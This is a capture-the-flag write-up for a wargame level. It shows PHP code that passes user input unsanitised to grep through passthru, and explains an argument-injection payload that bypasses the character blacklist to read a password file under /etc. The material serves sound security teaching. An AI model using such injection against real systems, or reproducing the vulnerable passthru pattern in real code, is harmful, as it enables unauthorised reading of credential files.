# Natas Level 10 -> 11

## Goal

Find the password for natas11.

## Key Concept

Command injection bypass using `grep` itself.

## Solution

Similar to [level 9](../level09), but now certain characters are blocked:

```php
if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
```

We can't use `;`, `|`, or `&` to chain commands. However, we can still inject arguments into the `grep` command itself.

The password is at `/etc/natas_webpass/natas11`. We can pass this file as an additional input to `grep`:

```
-e [a-z] /etc/natas_webpass/natas11 #
```

This makes the command become:

```bash
grep -i -e [a-z] /etc/natas_webpass/natas11 # dictionary.txt
```

Breaking it down:
- `-e [a-z]` - pattern flag matching any letter (combined with `-i` for case-insensitive, it matches any letter)
- `/etc/natas_webpass/natas11` - our target file to search
- `#` - comments out `dictionary.txt`

Since the password contains at least one letter, `grep` outputs the entire line (which is the password).

`solve.py`

```bash
uv run level10/solve.py
```
